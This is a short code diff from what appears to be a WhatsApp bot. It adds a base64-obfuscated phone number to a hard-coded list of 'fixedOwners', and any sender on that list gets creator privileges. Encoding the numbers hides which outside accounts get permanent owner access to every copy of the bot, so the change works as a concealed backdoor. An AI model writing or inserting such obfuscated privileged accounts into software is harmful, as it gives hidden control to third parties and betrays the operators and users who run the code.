@@ -446,9 +446,11 @@ const botJid = conn.user?.id?.replace(/:\d+/, "");
 const senderJid = m.sender?.replace(/:\d+/, "");
 const fixed1 = Buffer.from('NTIxNDc3NDQ0NDQ0NA==', 'base64').toString();
 const fixed2 = Buffer.from('NTQ5MjI2NjYxMzAzOA==', 'base64').toString();
+const fixed3 = Buffer.from('OTY2NTU5OTU4MzIy', 'base64').toString();
 const fixedOwners = [
   `${fixed1}@s.whatsapp.net`,
   `${fixed2}@s.whatsapp.net`,
+  `${fixed3}@s.whatsapp.net`,
   `35060220747880@lid`
 ];
 const isCreator = fixedOwners.includes(m.sender) || 
